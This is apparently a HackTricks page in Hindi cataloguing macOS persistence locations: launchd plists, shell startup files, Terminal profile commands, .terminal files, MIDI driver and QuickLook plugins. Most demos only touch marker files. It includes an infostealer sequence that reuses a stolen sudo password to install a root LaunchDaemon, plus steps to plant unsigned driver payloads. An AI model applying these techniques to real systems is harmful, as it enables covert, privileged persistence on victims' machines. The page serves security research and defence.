# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

यह section काफी हद तक [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog series पर आधारित है। इसका उद्देश्य उन locations की पहचान करना है जहाँ file write से बाद में code execution हो सकता है, execution को trigger करने वाली घटना, और आवश्यक permissions। किसी location का मौजूद होना इस बात का प्रमाण नहीं है कि वह mechanism enabled है। नीचे बताए गए local checks macOS 26.5.2 (5 October 2026) पर किए गए थे; उनसे हर macOS release के व्यवहार की पुष्टि नहीं होती।

> [!NOTE]
> “Write-triggered” का मतलब हमेशा यह नहीं होता कि “लिखने के तुरंत बाद चलता है।” कुछ locations को केवल login के समय, किसी खास application के शुरू होने पर या user द्वारा कोई action करने पर ही पढ़ा जाता है। पहले से configured job के अंदर writable payload होना, नया job register करने की permission से भी अलग बात है। किसी technique पर भरोसा करने से पहले disposable account या VM में जाँचें।

## Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगी, जिनसे आप कोई चीज़ **file में लिखकर** और फिर किसी बहुत **आम action**, तय **समय** या ऐसे **action** का इंतज़ार करके उसे execute कर सकते हैं, जिसे आमतौर पर sandbox के अंदर से root permissions के बिना किया जा सकता है।

### Launchd

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
  - **Trigger**: User login (या explicit registration)
  - Root आवश्यक
- **`/Library/LaunchDaemons`**
  - **Trigger**: System boot (या explicit registration)
  - Root आवश्यक
- **`/System/Library/LaunchAgents`**
  - **Trigger**: User login; Apple की protected system location
- **`/System/Library/LaunchDaemons`**
  - **Trigger**: System boot; Apple की protected system location
- **`~/Library/LaunchAgents`**
  - **Trigger**: दोबारा login करने पर

`launchd` द्वारा scan की जाने वाली `~/Library/LaunchDaemons` location मौजूद नहीं है। Per-user jobs `~/Library/LaunchAgents` में होते हैं; system daemon directory `/Library/LaunchDaemons` है। [Apple की launchd startup guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) scan की जाने वाली locations का दस्तावेज़ देती है।

> [!TIP]
> एक दिलचस्प तथ्य यह है कि **`launchd`** के Mach-o section `__Text.__config` में एक embedded property list होती है, जिसमें वे अन्य जाने-माने services शामिल होते हैं जिन्हें launchd को शुरू करना होता है। इसके अलावा, इन services में `RequireSuccess`, `RequireRun` और `RebootOnSuccess` भी हो सकते हैं, जिनका मतलब है कि उन्हें चलना और सफलतापूर्वक पूरा होना आवश्यक है।
>
> बेशक, code signing के कारण इसे modify नहीं किया जा सकता।

#### Description & Exploitation

Startup के समय OX S kernel द्वारा execute किया जाने वाला **पहला** **process** **`launchd`** है और shutdown के समय पूरा होने वाला आखिरी process भी यही है। इसका **PID 1** ही होना चाहिए। यह process इन locations में मौजूद **ASEP** **plists** में दिए गए configurations को **पढ़ेगा और execute करेगा**:

- `/Library/LaunchAgents`: Admin द्वारा installed per-user agents
- `/Library/LaunchDaemons`: Admin द्वारा installed system-wide daemons
- `/System/Library/LaunchAgents`: Apple द्वारा दिए गए per-user agents
- `/System/Library/LaunchDaemons`: Apple द्वारा दिए गए system-wide daemons

जब कोई user login करता है, तो `launchd` उस user के `~/Library/LaunchAgents` में मौजूद plists को उसी user की permissions के साथ load करता है। Jobs उनकी keys के अनुसार शुरू होते हैं; केवल plist load होने का मतलब यह नहीं है कि process तुरंत execute होगा।

**Agents और daemons के बीच मुख्य अंतर यह है कि agents user के login करने पर load होते हैं और daemons system startup पर load होते हैं** (क्योंकि ssh जैसी services को किसी भी user के system access करने से पहले execute होना पड़ता है)। Agents GUI का उपयोग कर सकते हैं, जबकि daemons को background में चलना होता है।

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

`ProgramArguments` का हर element एक अलग argument होता है; `launchd` किसी एक string को shell command के रूप में parse नहीं करता। ऊपर दिए गए सही किए गए उदाहरण की syntax जाँच उसे load किए बिना `plutil -lint /path/to/example.plist` से की जा सकती है। `ProgramArguments`, `RunAtLoad`, और `KeepAlive` के लिए स्थानीय `man launchd.plist` entry देखें।

#### मौजूदा jobs में file-event triggers

**पहले से loaded** agent या daemon, किसी नामित path में बदलाव होने पर शुरू होने के लिए `WatchPaths` का उपयोग कर सकता है। `QueueDirectories` किसी directory के non-empty होने पर job शुरू करता है; `StartOnMount` किसी volume के mount होने पर शुरू होता है। [Apple की launchd guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) में `WatchPaths` और `QueueDirectories` के उदाहरण शामिल हैं। किसी watched file में write करने से **पहले से configured job** trigger होता है; इससे arbitrary code execution तभी मिलता है, जब writer उस job के executable, script या उस data को भी control कर सके जिसे job interpret करता है। किसी scanned या registered location के बाहर नई plist लिखने मात्र से वह load नहीं होती।

यह self-cleaning PoC एक विशिष्ट नाम वाला **temporary user agent** register करता है, केवल अपनी watched file में बदलाव करता है, और agent को हटा देता है। इसे macOS 26.5.2 पर logout या restart किए बिना सफलतापूर्वक चलाया गया था:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

लोकल रन ने `watch fired: True` प्रिंट किया, और `bootout` सफल रहा। यहाँ `launchctl bootstrap` का उपयोग केवल आइसोलेटेड PoC के अंदर किया जाता है; पहले से लोड हो चुकी job के लिए इसकी **ज़रूरत नहीं** है। किसी मौजूदा job का सुरक्षित आकलन करने के लिए, उसकी plist और resolved `ProgramArguments` path पढ़ें, फिर उसे बदले बिना जाँचें कि संबंधित executable या interpreted file writable है या नहीं।

कुछ मामलों में **किसी agent को user के login करने से पहले execute करना ज़रूरी होता है**; इन्हें **PreLoginAgents** कहा जाता है। उदाहरण के लिए, login के समय assistive technology उपलब्ध कराने के लिए ये उपयोगी हैं। इन्हें `/Library/LaunchAgents` में भी पाया जा सकता है ([**यहाँ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) एक उदाहरण देखें)।

> [!TIP]
> नई Daemons या Agents config files **अगले reboot के बाद या** `launchctl load <target.plist>` **का उपयोग करने पर लोड होंगी**। `launchctl -F <file>` से `.plist` extension के बिना भी plist files लोड करना **संभव है** (हालाँकि वे plist files reboot के बाद अपने-आप लोड नहीं होंगी)।\
> `launchctl unload <target.plist>` से **unload करना** भी संभव है (उससे जुड़ा process terminate हो जाएगा),
>
> यह **सुनिश्चित करने** के लिए कि कोई चीज़ (जैसे override) किसी **Agent** या **Daemon** को **चलने से रोक** नहीं रही है, यह चलाएँ: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

मौजूदा user द्वारा लोड किए गए सभी agents और daemons की सूची बनाएँ:

```bash
launchctl list
```

#### दुर्भावनापूर्ण LaunchDaemon chain का उदाहरण (password reuse)

एक हालिया macOS infostealer ने **captured sudo password** का फिर से उपयोग करके एक user agent और root LaunchDaemon स्थापित किया:<sup>[[1]](#references)</sup>

- agent loop को `~/.agent` में लिखें और उसे executable बनाएँ।
- उस agent की ओर संकेत करने वाली plist `/tmp/starter` में बनाएँ।
- चोरी किए गए password का `sudo -S` के साथ फिर से उपयोग करके उसे `/Library/LaunchDaemons/com.finder.helper.plist` में कॉपी करें, `root:wheel` सेट करें और `launchctl load` से लोड करें।
- आउटपुट को अलग करने के लिए `nohup ~/.agent >/dev/null 2>&1 &` के ज़रिए agent को चुपचाप शुरू करें।

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> `/Library/LaunchDaemons` में रखी daemon plist, उसे user ownership देने से सुरक्षित नहीं हो जाती। system jobs के लिए `launchd` को उचित ownership और permissions चाहिए; असुरक्षित plist को वह अस्वीकार कर सकता है। आम तौर पर root-owned daemon root के रूप में चलता है, जब तक कि उसकी configuration किसी अन्य account का चयन न करे। Job का `UserName`, `GroupName`, ownership और `launchctl` diagnostics जाँचें; केवल plist के owner के नाम से execution identity का अनुमान न लगाएँ।

#### launchd के बारे में अधिक जानकारी

**`launchd`** पहला user mode process है, जिसे **kernel** से शुरू किया जाता है। इसका शुरू होना **सफल** होना चाहिए और यह **बंद या crash नहीं हो सकता**। यह कुछ **killing signals** से भी **सुरक्षित** रहता है।

`launchd` सबसे पहले जो काम करता है, उनमें से एक है सभी **daemons** को **शुरू** करना, जैसे:

- समय के आधार पर चलने वाले **Timer daemons**:
  - macOS 26.5.2 में `com.apple.atrun.plist`, `/usr/libexec/atrun` को `StartInterval = 30` seconds के साथ invoke करता है; इसकी प्रभावी enabled state, plist की `Disabled` key से अलग हो सकती है, क्योंकि launchd overrides को अलग से रखता है।
  - `com.vix.cron.plist`, `/usr/sbin/cron` को तब invoke करता है जब `/usr/lib/cron/tabs` में jobs मौजूद हों। `com.apple.systemstats.daily` एक अलग scheduled service है, cron daemon नहीं।
- **Network daemons**, जैसे:
  - `org.cups.cups-lpd`: TCP पर (`SockType: stream`) `SockServiceName: printer` के साथ सुनता है
    - SockServiceName, `/etc/services` में मौजूद port या service होना चाहिए
  - `com.apple.xscertd.plist`: TCP port 1640 पर सुनता है
- निर्दिष्ट path में बदलाव होने पर चलने वाले **Path daemons**:
  - `com.apple.postfix.master`: path `/etc/postfix/aliases` को जाँचता है
- **IOKit notifications daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: `MachServices` entry में `com.apple.xscertd.helper` नाम दिया गया है
- **UserEventAgent:**
  - यह पिछले वाले से अलग है। यह launchd से किसी खास event के जवाब में apps शुरू करवाता है। हालाँकि, इस मामले में मुख्य binary `launchd` नहीं, बल्कि `/usr/libexec/UserEventAgent` है। यह SIP restricted folder `/System/Library/UserEventPlugins/` से plugins load करता है; हर plugin अपना initialiser `XPCEventModuleInitializer` key में बताता है, या पुराने plugins के मामले में, अपने `Info.plist` के `CFPluginFactories` dict में `FB86416D-6164-2070-726F-70735C216EC0` key के अंतर्गत बताता है।

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको ऐसा app ढूँढ़ना होगा जिसमें TCC bypass हो और जो इन files को load करने वाला shell execute करे

#### Locations

- **`~/.zshenv`** (या इसका नया compiled रूप **`~/.zshenv.zwc`**)
  - **Trigger**: कोई भी सामान्य zsh invocation, जिसमें noninteractive `zsh -c` भी शामिल है; `zsh -f` user startup files को छोड़ देता है।
- **`~/.zshrc`**
  - **Trigger**: Interactive zsh शुरू होता है।
- **`~/.zprofile`, `~/.zlogin`**
  - **Trigger**: Login zsh शुरू होता है; ये क्रमशः `.zshrc` से पहले और बाद में पढ़े जाते हैं।
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Trigger**: zsh के साथ terminal खोलें
  - Root आवश्यक है
- **`~/.zlogout`**
  - **Trigger**: Login zsh सामान्य रूप से बंद होता है; हर terminal या shell exit पर नहीं।
- **`/etc/zlogout`**
  - **Trigger**: zsh के साथ terminal बंद करें
  - Root आवश्यक है
- संभवतः और जानकारी यहाँ: **`man zsh`**
- **`~/.bashrc`**
  - **Trigger**: Interactive **non-login** Bash शुरू करें। Interactive login Bash इसे तभी पढ़ता है, जब कोई login file इसे स्पष्ट रूप से source करे।
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Trigger**: Login Bash शुरू करें; इस क्रम में पहली readable file चलती है। इससे पहले वाली दोनों files में से कोई मौजूद हो, तो `~/.profile` छोड़ दी जाती है।
- **`/etc/profile`**
  - **Trigger**: Login Bash शुरू करें; इसे बदलने के लिए root आवश्यक है।
- **`~/.tcshrc`** या, इसके न होने पर, **`~/.cshrc`**
  - **Trigger**: `tcsh` शुरू करें; इस Mac पर noninteractive `tcsh -c` भी शामिल है। User को वास्तव में `tcsh` चलाना होगा; यह macOS का default shell नहीं है।
- **`~/.login`**
  - **Trigger**: Login `tcsh` शुरू करें; यह अपनी rc file के बाद चलती है।
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Trigger**: xterm के साथ चलने की अपेक्षा है, लेकिन यह **installed नहीं है** और install करने के बाद भी यह error आता है: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### विवरण और Exploitation

`zsh` या `bash` जैसे shell environment शुरू करने पर, **कुछ startup files चलाई जाती हैं**। macOS में वर्तमान default shell `/bin/zsh` है। Terminal या SSH, login shell शुरू करता है या interactive shell, यह उनकी configuration पर निर्भर करता है; यह न मानें कि हर session में ऊपर दी गई हर file चलती है। macOS में `bash` और `sh` भी मौजूद हैं, लेकिन उन्हें इस्तेमाल करने के लिए स्पष्ट रूप से invoke करना पड़ता है।<sup>[[2]](#references)</sup> [zsh startup-file reference](https://zsh.sourceforge.io/Doc/Release/Files.html) में क्रम, `ZDOTDIR` override और `.zwc` नियम बताए गए हैं।

नीचे दिया गया read-only प्रयोग macOS 26.5.2 पर disposable `ZDOTDIR` का उपयोग करके किया गया था। इसमें दिखाया गया है कि कौन-सी user files पढ़ी गईं; किसी असली shell startup file में बदलाव नहीं किया गया था:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

देखा गया क्रम यह था: `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`। `ZDOTDIR` का पहले से alternate directory पर point करना ज़रूरी है; किसी मनमानी directory में केवल files लिखना काफ़ी नहीं है।

[Bash की startup reference](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) login और interactive shells के बीच अंतर बताती है। macOS 26.5.2 test machine पर, चारों user startup files वाले अलग-थलग `HOME` में ये परिणाम मिले: `bash -c` → कोई नहीं, `bash -ic` → `.bashrc`, `bash -lc` और `bash -lic` → केवल `.bash_profile`। `.bash_profile` हटाने पर login Bash ने `.bash_login` पढ़ा, और उसे भी हटाने पर `.profile` पढ़ा। `BASH_ENV` noninteractive Bash को किसी file की ओर point कर सकता है, लेकिन invoking process में यह environment variable पहले से set होना चाहिए। Login Bash से स्पष्ट रूप से `exit` करने पर `~/.bash_logout` भी load हो सकता है।

स्थानीय `tcsh(1)` manual अपना अलग startup क्रम दर्ज करता है। अस्थायी `HOME` के साथ, `/bin/tcsh -c :` ने `.tcshrc` पढ़ा, या `.tcshrc` मौजूद न होने पर `.cshrc` पढ़ा। अस्थायी login `tcsh` ने `.tcshrc` और `.login` पढ़े। इन जाँचों में केवल अस्थायी files बनाई और हटाई गईं।

### दोबारा खोले गए Applications

> [!CAUTION]
> बताए गए exploitation को configure करने और logout करके वापस login करने, या यहाँ तक कि reboot करने पर भी testing में app execute नहीं हुआ। इन actions के दौरान app का running होना ज़रूरी हो सकता है।

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Trigger**: Applications को restart पर फिर से खोलना

#### विवरण और Exploitation

फिर से खोले जाने वाले सभी applications plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup> में होते हैं।

इसलिए, फिर से खोले जाने वाले applications से अपना app launch करवाने के लिए, आपको बस **अपना app list में जोड़ना है**।

UUID को उस directory की listing करके या `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` से ढूँढ़ा जा सकता है।

फिर से खोले जाने वाले applications देखने के लिए, आप यह चला सकते हैं:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

इस सूची में **एप्लिकेशन जोड़ने** के लिए आप इसका उपयोग कर सकते हैं:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal का उपयोग करने वाले user के पास FDA permissions होती हैं

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Trigger**: उस profile का उपयोग करके एक नई Terminal window या tab खोलें, जिसकी Shell settings में startup command मौजूद हो

#### Description & Exploitation

**`~/Library/Preferences`** में Applications के लिए user की preferences store होती हैं। इनमें से कुछ preferences में **अन्य applications/scripts execute करने** का configuration हो सकता है।<sup>[[5]](#references)</sup>

उदाहरण के लिए, Terminal Startup में कोई command execute कर सकता है:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

यह config **`~/Library/Preferences/com.apple.Terminal.plist`** file में इस तरह दिखाई देता है:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

यदि संबंधित profile में startup command मौजूद है और Terminal उस preference को पढ़ता है, तो उस profile का उपयोग करने वाला नया session उसे execute कर सकता है। [Apple की मौजूदा Terminal guide](https://support.apple.com/guide/terminal/trmlshll/mac) हर profile के लिए **Shell → Startup** command का दस्तावेज़ देती है। उस profile का उपयोग करके नया session शुरू किए बिना केवल Terminal खोलना पर्याप्त नहीं है। नीचे दिए गए preference edits research Mac पर **नहीं** किए गए थे।

आप इसे CLI से जोड़ सकते हैं:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / अन्य फ़ाइल एक्सटेंशन

- Sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal का उपयोगकर्ता की FDA permissions तक पहुँच हुआ करती थी

#### स्थान

- **कहीं भी**
  - **ट्रिगर**: संबंधित `.terminal`, `.command`, या `.tool` फ़ाइल खोलें

#### विवरण और Exploitation

यदि कोई उपयोगकर्ता **`.terminal`** settings फ़ाइल खोलता है, तो Terminal उसकी profile से एक session बना सकता है; executable **`.command`** और **`.tool`** फ़ाइलें भी Terminal में खुल सकती हैं। यह फ़ाइल खोलने से शुरू होने वाला स्पष्ट trigger है, केवल Terminal खोलने से execution नहीं होता। विरासत में मिली TCC access, Terminal को मिली वास्तविक permissions और किए गए operation पर निर्भर करती है। नीचे दिया गया ऐतिहासिक उदाहरण research Mac पर नहीं चलाया गया था।

इसे आज़माएँ:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

आप नियमित shell scripts वाले content के साथ **`.command`**, **`.tool`** extensions का भी इस्तेमाल कर सकते हैं; ये भी Terminal में खुलेंगी।

> [!CAUTION]
> अगर Terminal के पास **Full Disk Access** है, तो वह यह कार्रवाई पूरी कर सकेगा (ध्यान दें कि execute किया गया command Terminal window में दिखाई देगा)।

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - आपको कुछ अतिरिक्त TCC access मिल सकता है

#### स्थान

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root आवश्यक है
  - **Trigger**: Core Audio server एक संगत HAL device plug-in लोड करता है; server को restart करने से दोबारा खोज हो सकती है
- **`/Library/Audio/Plug-ins/Components`**
  - Root आवश्यक है
  - **Trigger**: कोई audio host इंस्टॉल किए गए Audio Unit को खोजता और instantiate करता है
- **`~/Library/Audio/Plug-ins/Components`**
  - **Trigger**: कोई audio host इंस्टॉल किए गए Audio Unit को खोजता और instantiate करता है
- **`/System/Library/Components`**
  - Apple द्वारा दिया गया, system-protected स्थान
  - **Trigger**: कोई audio host मेल खाने वाले system component को instantiate करता है

#### विवरण

पिछले writeups के अनुसार, **कुछ audio plugins compile** करके उन्हें लोड करवाना संभव है।<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plug-ins और Audio Units अलग-अलग load paths हैं। [Apple की Audio Unit hosting guide](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) के अनुसार, host को component ढूँढ़कर instantiate करना होता है; किसी scan directory में उसे copy करना या `coreaudiod` को restart करना अपने आप में execution का प्रमाण नहीं है। AUv2 plug-ins host process में चलते हैं, जबकि [Apple की मौजूदा Audio Unit guidance](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) के अनुसार, macOS पर AUv3 डिफ़ॉल्ट रूप से अलग process में चलता है। Signature, sandbox और library-validation की पाबंदियाँ host पर निर्भर करती हैं। Research Mac पर कोई audio plug-in install या execute नहीं किया गया।

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - आपका code आपके app के sandbox में नहीं, बल्कि `MIDIServer` process के अंदर चलता है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` अपने अलग `seatbelt` sandbox profile के तहत चलता है

#### स्थान

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root की आवश्यकता नहीं (user-writable)
  - **Trigger**: `MIDIServer` फिर से शुरू होता है। CoreMIDI का इस्तेमाल करने वाला कोई भी process पहली बार शुरू होने पर इसे मांग के अनुसार launch करता है (*Audio MIDI Setup*, GarageBand, DAW खोलने पर या WebMIDI इस्तेमाल करने वाले page पर जाने पर)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root आवश्यक है
  - **Trigger**: ऊपर जैसा ही

#### विवरण और Exploitation

Apple का `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`), `Audio/MIDI Drivers` directories से MIDI **driver** bundles लोड करता है। यह binary Apple-signed है, लेकिन इसके साथ `com.apple.security.cs.disable-library-validation` entitlement दिया जाता है, इसलिए यह ऐसा bundle लोड करेगा जो **unsigned हो या किसी दूसरी team द्वारा ad-hoc signed हो**। इससे **बिना root के**, Apple के स्वामित्व वाले एक अलग process के अंदर code execution मिलता है।<sup>[[53]](#references)</sup>

macOS 26 पर सत्यापित (केवल पढ़ने के लिए):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

एक driver एक standard bundle होता है, जो `MIDIDriverInterface` factory export करता है; payload को factory/constructor में रखने से यह `MIDIServer` द्वारा drivers को enumerate करते ही run हो जाता है। इसे build करके `~/Library/Audio/MIDI Drivers/Evil.plugin` के रूप में रखें, फिर logout/reboot किए बिना इसे load करवाएँ:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - आपको कुछ अतिरिक्त TCC access मिल सकता है

#### स्थान

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### विवरण और Exploitation

QuickLook plugins तब execute किए जा सकते हैं, जब आप **किसी फ़ाइल का preview खोलते हैं** (Finder में फ़ाइल चुनकर space bar दबाएँ) और उस **फ़ाइल प्रकार को support करने वाला plugin** इंस्टॉल हो।<sup>[[8]](#references)</sup>

अपना QuickLook plugin compile करके, उसे लोड करने के लिए ऊपर दिए गए किसी location पर रखना और फिर किसी supported फ़ाइल पर space दबाकर उसे trigger करना संभव है।

ये paths legacy `.qlgenerator` bundles से संबंधित हैं; [Apple's Quick Look architecture guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) search order और matching file types का दस्तावेज़ीकरण करता है। मौजूदा Quick Look **app extensions**, app के साथ package किए जाते हैं और इनके registration तथा execution के नियम अलग होते हैं। किसी generator का मौजूद होना यह साबित नहीं करता कि type selection में वही चुना जाएगा या उसका code Finder के भीतर ही चलेगा। Legacy generator path की जाँच documentation और directory की मौजूदगी के आधार पर की गई थी; research Mac पर कोई generator इंस्टॉल या load नहीं किया गया था।

### ~~Login/Logout Hooks~~

> [!CAUTION]
